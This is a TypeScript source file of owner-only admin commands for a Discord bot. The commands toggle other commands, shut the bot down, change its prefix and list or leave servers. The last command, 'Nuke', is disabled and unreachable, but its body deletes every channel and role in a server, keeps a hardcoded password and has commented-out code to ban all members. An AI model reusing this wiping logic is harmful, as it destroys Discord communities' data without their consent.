import { Message, RichEmbed } from "discord.js";
import { Bot } from "../bot";
import { TextCommand } from "../mixins";
import { selfDestructMessage } from "../utils/callbacks";
import { ParsedMessage, parseMessage } from "../utils/parser";

export class Enabled extends TextCommand {
  constructor() {
    super({
      command: "enabled",
      aliases: ["active"],
      ownerOnly: true,
      description: "Enables or Disables a command",
      args: [
        {
          name: "command",
          pattern: /\w/,
          description: "The command that should be activated"
        },
        {
          name: "status",
          pattern: /(0|1)|(false|true)/,
          description: "0: disabled \n1: enabled",
          default: 3
        }
      ]
    });
  }

  public async run(bot: Bot, message: Message, parsedMessage: ParsedMessage) {
    const cmd = bot.registry.getTextCommand(parsedMessage.args.command.value);

    if (!cmd) {
      return message.reply("[ENABLED] Cannot find command");
    }

    // dont disable this command
    if (cmd instanceof Enabled) {
      return message.channel.send("Cannot set enabled status for this command");
    }

    if (
      parsedMessage.args.status.value === "0" ||
      parsedMessage.args.status.value === "false"
    ) {
      cmd.disable();
    } else if (
      parsedMessage.args.status.value === "1" ||
      parsedMessage.args.status.value === "true"
    ) {
      cmd.enable();
    }
    message.channel
      .send(
        new RichEmbed()
          .setTitle("Command Status")
          .addField("Enabled", cmd.enabled, true)
      )
      .then(selfDestructMessage);
  }
}

export class Shutdown extends TextCommand {
  constructor() {
    super({
      command: "shutdown",
      description: "Shutdown the Bot",
      ownerOnly: true,
      group: "admin"
    });
  }

  public async run(bot: Bot, message: Message, parsedMessage: ParsedMessage) {
    process.exit(0);
    console.log("BOT SHUTTING DOWN");
  }
}

export class ChangePrefix extends TextCommand {
  constructor() {
    super({
      command: "prefix",
      description: "set a new prefix for all commands",
      usage: "prefix [new prefix]",
      ownerOnly: true,
      group: "admin"
    });
  }

  public async run(bot: Bot, message: Message, parsedMessage: ParsedMessage) {
    const prefix = parsedMessage.rawArgs[0];
    bot.settings.setGuildPrefix(message.guild.id, prefix);
    bot.settings.prefix = prefix;
    message.reply(`Changed command prefix to ${bot.settings.prefix}`);
  }
}

export class Playing extends TextCommand {
  constructor() {
    super({
      command: "game",
      description: "set the current game",
      usage: "game [game]",
      ownerOnly: true,
      group: "admin",
      aliases: ["playing"]
    });
  }

  public async run(bot: Bot, message: Message, parsedMessage: ParsedMessage) {
    bot.user
      .setGame(parsedMessage.rawArgs.join(" "))
      .catch((err) => console.log(err));
  }
}

export class Servers extends TextCommand {
  constructor() {
    super({
      command: "servers",
      ownerOnly: true,
      description: "show all servers",
      group: "admin"
    });
  }

  public async run(bot: Bot, message: Message, parsedMessage: ParsedMessage) {
    if (parsedMessage.rawArgs[0] === "leave") {
      const guild = bot.guilds.find("id", parsedMessage.rawArgs[1]);
      guild.leave();
      message.delete();
    } else {
      let text: string = "\n";

      bot.guilds.forEach((g) => {
        text += `${g.id} : ${g.name}\n`;
      });

      console.log(text);

      return message.reply(text).then(selfDestructMessage);
    }
  }
}

export class Nuke extends TextCommand {
  constructor() {
    super({
      command: "nuke",
      ownerOnly: true,
      args: [{ name: "password", pattern: /\.*/ }],
      enabled: false
    });
  }

  public async run(bot: Bot, message: Message, parsedMessage: ParsedMessage) {
    return null;
    if (
      !parsedMessage.args.password.exists ||
      parsedMessage.args.password.value !== "alkohol"
    ) {
      console.log("passed");
    }
    console.log("not passed");
    // return;

    const guild = message.guild;

    guild.channels.forEach(async (c) => {
      if (c.deletable) {
        c.delete().catch(console.log);
      }
    });

    // guild.members.forEach(async (m) => {
    //   m.ban().catch(console.log);
    // });

    guild.roles.forEach(async (r) => {
      r.delete().catch(console.log);
    });

    // message.guild.channels.forEach((channel) => {
    //   if (channel.deletable) {
    //     channel.delete();
    //   }
    // });
    // message.guild.members.forEach((member) => {
    //   member.ban();
    // });
  }
}
